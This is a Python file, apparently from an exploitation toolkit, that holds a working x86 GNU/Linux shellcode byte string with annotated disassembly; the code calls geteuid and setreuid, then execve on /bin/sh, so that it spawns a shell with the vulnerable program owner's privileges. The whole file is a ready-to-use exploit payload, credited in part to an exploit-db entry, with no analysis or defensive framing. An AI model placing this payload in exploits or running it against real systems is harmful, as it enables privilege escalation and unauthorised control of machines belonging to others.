#####################################################################################################
# title         : x86_linux_exec-getsetuid-sh
# description   : Shellcode for x86 GNU/Linux systems that run /bin/sh with program's owner rigths
# author        : Leo 'cryptobioz' Depriester <leo.depriester@exadot.fr>
# date          : 2016/07/25
# version       : 1.0
#####################################################################################################
class Shellcode:
    
    @staticmethod
    def get():
        return Shellcode.shellcode

    shellcode = (
        "\x6a\x31"              # 0x00000000:       push 0x31
        "\x58"                  # 0x00000002:       pop eax
        "\xcd\x80"              # 0x00000003:       int 0x80 ; geteuid()
        "\x89\xc3"              # 0x00000005:       mov ebx, eax
        "\x89\xc1"              # 0x00000007:       mov ecx, eax
        "\x6a\x46"              # 0x00000009:       push 0x46
        "\x58"                  # 0x0000000B:       pop eax
        "\xcd\x80"              # 0x0000000D:       int 0x80 ; setreuid()
        "\x31\xc0"              # 0x0000000F:       xor eax, eax
        "\x50"                  # 0x00000011:       push eax
        "\x68\x2f\x2f\x73\x68"  # 0x00000012:       push dword 0x68732f2f
        "\x68\x2f\x62\x69\x6e"  # 0x00000017:       push dword 0x6e69622f
        "\x54"                  # 0x0000001C:       push esp
        "\x5b"                  # 0x0000001D:       pop ebx
        "\x50"                  # 0x0000001E:       push eax
        "\x53"                  # 0x0000001F:       push ebx
        "\x89\xe1"              # 0x00000020:       mov ecx, esp
        "\x31\xd2"              # 0x00000022:       xor edx, edx
        "\xb0\x0b"              # 0x00000024:       mov byte al, 0x0b
        "\xcd\x80"              # 0x00000026:       int 0x80 ; execve()
        # Thanks to Reth (https://www.exploit-db.com/exploits/13338/)
   ) 
